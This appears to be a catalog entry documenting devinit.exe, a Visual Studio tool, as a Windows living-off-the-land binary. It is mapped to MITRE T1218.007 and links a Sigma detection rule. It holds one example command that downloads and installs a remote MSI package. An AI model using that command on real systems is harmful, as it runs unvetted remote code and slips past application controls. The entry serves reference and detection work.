---
id: windows-execution-devinit
namespace: windows:execution:devinit
name: devinit
description: 'Visual Studio 2019 tool Located at: C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\Tools\devinit\devinit.exe; C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\Tools\devinit\devinit.exe.'
author: mr.d0x
version: 1.0.0
capabilities:
- security.execution.command
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- devinit
parameters: []
features: []
execution:
  template: devinit
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Downloads an MSI file to C:\Windows\Installer and then installs it. (Executes code from a (remote) MSI file.)
  command: devinit.exe run -t msi-install -i {REMOTEURL:.msi}
references:
- label: '1460815932402679809'
  url: https://twitter.com/mrd0x/status/1460815932402679809
techniques:
- execution
- defense-evasion
mitre_ids:
- T1218.007
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_devinit_lolbin_usage.yml
install:
- method: choco
  package_name: devinit
  commands:
  - choco install devinit
---


# devinit

devinit is a Windows LOLBin. Visual Studio 2019 tool Located at: C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\Tools\devinit\devinit.exe; C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\Tools\devinit\devinit.exe.
